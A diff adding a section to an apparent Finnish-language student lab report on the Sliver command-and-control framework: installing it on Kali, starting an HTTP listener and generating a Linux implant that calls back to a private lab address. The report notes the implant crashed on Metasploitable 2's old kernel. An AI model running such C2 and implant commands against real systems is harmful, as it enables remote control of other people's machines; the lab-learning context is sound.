@@ -57,6 +57,40 @@ Suoritin tiedoston Metasploitablesta käsin (./haittaohjelma_32.elf), jolloin Ka
 
 Tämä perinteinen tapa luoda yhteys on tehokas, mutta verkkotasolla se on "äänekäs". Se luo yhden jatkuvan TCP-putken, joka on helppo havaita, jos verkonvalvonta etsii pitkäkestoisia ja epätavallisia yhteyksiä porttiin 4444
 
+## C)  Hello, Sliver
+
+<img width="678" height="186" alt="sliver installation" src="https://github.com/user-attachments/assets/0ce8140c-bdda-448f-8b1f-70048742a855" />
+
+Sliver asennettiin Kali Linuxiin suoraan virallisista pakettivarastoista.
+
+```
+sudo apt update
+sudo apt install sliver
+```
+
+<img width="640" height="393" alt="sliver startup" src="https://github.com/user-attachments/assets/abdd8b59-adb8-48bd-8a55-dbf27f02ae22" />
+
+Asennuksen jälkeen Sliver-palvelin käynnistettiin komennolla (`sliver-server`).
+
+<img width="327" height="218" alt="http sliver" src="https://github.com/user-attachments/assets/d51aae5a-ac58-4b6f-a408-3e7ef9ad481b" />
+
+Sliverissä käynnistettiin HTTP-palvelin porttiin 80. Portin 80 varaaminen vaati muiden palveluiden (kuten Apache) sammuttamista.
+
+```
+sliver > http
+```
+
+<img width="692" height="80" alt="too old" src="https://github.com/user-attachments/assets/a15a521b-c1ce-4629-a554-6891e0f5ef9f" />
+
+<img width="223" height="142" alt="nada " src="https://github.com/user-attachments/assets/82b956ae-e12d-4cf6-9050-bd618e4eef8e" />
+
+<img width="646" height="171" alt="sliver file creation" src="https://github.com/user-attachments/assets/4cab8a22-f363-4c80-87b3-b09126a32b7b" />
 
 
+
+Tehtävässä havaittiin yhteensopivuusongelma: modernit Go-kielellä käännetyt Sliver-implantit vaativat Linux-kernelin version 2.6.32 tai uudemman. Koska Metasploitable 2:n kernel on ikivanha (2.6.24), implantti kaatui kohteessa välittömästi (ChatGPT). Raportointia ja analyysia varten implantti generoitiin ja suoritettiin paikallisesti Kalilla:
+
+```
+generate --http 192.168.18.129 --os linux --arch amd64 --save ./sliver_http.elf
+```
 
